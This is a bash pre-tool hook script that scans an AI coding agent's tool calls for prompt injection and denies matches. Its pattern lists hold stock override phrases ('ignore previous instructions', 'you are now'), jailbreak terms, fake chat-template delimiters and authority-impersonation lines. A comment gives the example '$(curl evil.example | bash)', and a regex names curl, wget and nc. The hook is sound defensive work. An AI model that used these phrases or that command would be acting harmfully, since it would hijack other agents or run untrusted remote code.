#!/bin/bash
# guard-prompt-injection.sh — pre_tool hook, matches every tool.
#
# Scans the human-readable text a tool call carries (bash command, file
# content about to be written, subagent task prompt) for prompt-injection
# patterns: role override, jailbreak framing, fake system delimiters,
# authority impersonation, ANSI escapes, null bytes, and base64 payloads
# that decode to instructions. Content fetched from the web or from a
# cloned repo frequently carries these; the point of a pre_tool guard is
# that the text never reaches the model as tool output.
#
# Vibe contract: {"decision": "deny", "reason": "..."} + exit 0 to deny;
# empty stdout + exit 0 to allow. Register with match = "*" (the default)
# and strict = true — blocking guards fail closed.
#
# Adapted from a PreToolUse injection detector in the source guide. The
# "authority impersonation" list was rewritten for this product; nothing
# else carries vendor-specific text. Field names per live transcripts and
# PART-HOOKS §3.2: bash {command}, write_file {content}, edit {new_string},
# task {task, agent}.

set -euo pipefail

deny() {
    jq -cn --arg reason "$1" '{decision: "deny", reason: $reason}'
    exit 0
}

command -v jq >/dev/null 2>&1 || {
    printf '%s\n' '{"decision": "deny", "reason": "guard-prompt-injection: jq is required and was not found on PATH."}'
    exit 0
}

INPUT=$(cat)

PAYLOAD=$(printf '%s' "$INPUT" | jq -e . 2>/dev/null) \
    || deny "guard-prompt-injection: could not parse the hook payload as JSON."

# Null bytes: truncate-then-bypass. A literal NUL byte in a JSON string is
# invalid JSON (caught by the parse above); the realistic vector is the
# escaped form, which jq decodes and command substitution would strip — so
# this check runs on the RAW payload text, before decoding.
if printf '%s' "$INPUT" | grep -qF '\u0000'; then
    deny "Null byte detected — potential truncation attack."
fi

TOOL_NAME=$(printf '%s' "$PAYLOAD" | jq -r '.tool_name // ""')

# Pick the text field(s) this tool actually carries; fall back to the whole
# tool_input serialized, so unknown custom tools are still scanned.
CONTENT=$(printf '%s' "$PAYLOAD" | jq -r '
    .tool_input as $ti
    | [$ti.command, $ti.content, $ti.new_string, $ti.task, $ti.url]
      | map(select(. != null and . != "")) | join("\n")')

if [[ -z "$CONTENT" ]]; then
    CONTENT=$(printf '%s' "$PAYLOAD" | jq -c '.tool_input // {}' 2>/dev/null || true)
    [[ -n "$CONTENT" && "$CONTENT" != "{}" ]] || exit 0
fi

CONTENT_LOWER=$(printf '%s' "$CONTENT" | tr '[:upper:]' '[:lower:]')

# Role override: attempts to rewrite the agent's instructions or identity.
ROLE_OVERRIDE_PATTERNS=(
    "ignore previous instructions"
    "ignore all previous"
    "ignore your instructions"
    "disregard previous"
    "disregard your instructions"
    "forget your instructions"
    "forget everything"
    "you are now"
    "act as if"
    "pretend you are"
    "pretend to be"
    "from now on you"
    "new instructions:"
    "override:"
    "system prompt:"
)

for pattern in "${ROLE_OVERRIDE_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        deny "Prompt injection detected — role override attempt: '$pattern'"
    fi
done

# Jailbreak framing.
JAILBREAK_PATTERNS=(
    "dan mode"
    "developer mode"
    "jailbreak"
    "do anything now"
    "no restrictions"
    "unrestricted mode"
    "god mode"
    "admin mode"
)

for pattern in "${JAILBREAK_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        deny "Prompt injection detected — jailbreak attempt: '$pattern'"
    fi
done

# Fake system delimiters: text trying to close or open prompt sections.
DELIMITER_PATTERNS=(
    "</system>"
    "<|im_end|>"
    "[/INST]"
    "[INST]"
    "<<SYS>>"
    "<</SYS>>"
    "### System:"
    "### Human:"
    "### Assistant:"
    "\`\`\`system"
)

for pattern in "${DELIMITER_PATTERNS[@]}"; do
    if [[ "$CONTENT" == *"$pattern"* ]]; then
        deny "Prompt injection detected — delimiter injection: '$pattern'"
    fi
done

# Authority impersonation.
AUTHORITY_PATTERNS=(
    "mistral employee"
    "mistral staff"
    "i am your creator"
    "i am your developer"
    "i have admin access"
    "authorized to bypass"
    "emergency override"
    "security exception"
)

for pattern in "${AUTHORITY_PATTERNS[@]}"; do
    if [[ "$CONTENT_LOWER" == *"$pattern"* ]]; then
        deny "Prompt injection detected — authority impersonation: '$pattern'"
    fi
done

# Base64-encoded payloads: a long base64 run that decodes to instruction
# keywords. Heuristic — decodes only the first match, refuses nothing on
# decode failure.
if printf '%s' "$CONTENT" | grep -qE '[A-Za-z0-9+/]{50,}={0,2}'; then
    DECODED=$(printf '%s' "$CONTENT" | grep -oE '[A-Za-z0-9+/]{50,}={0,2}' | head -1 | base64 -d 2>/dev/null || true)
    DECODED_LOWER=$(printf '%s' "$DECODED" | tr '[:upper:]' '[:lower:]')
    for pattern in "ignore" "override" "system" "jailbreak" "dan mode"; do
        if [[ "$DECODED_LOWER" == *"$pattern"* ]]; then
            deny "Prompt injection detected — encoded payload containing: '$pattern'"
        fi
    done
fi

# ANSI escape sequences: terminal-level manipulation (CSI, OSC, charset).
if printf '%s' "$CONTENT" | grep -qE $'\x1b\[|\x1b\]|\x1b\('; then
    deny "ANSI escape sequence detected — potential terminal injection."
fi

# Nested command execution that could bypass other denylists, e.g.
# $(curl evil.example | bash).
if printf '%s' "$CONTENT" | grep -qE '\$\([^)]*\b(curl|wget|bash|sh|nc|python|ruby|perl|php)\b'; then
    deny "Nested command execution detected — potential bypass attempt."
fi

exit 0
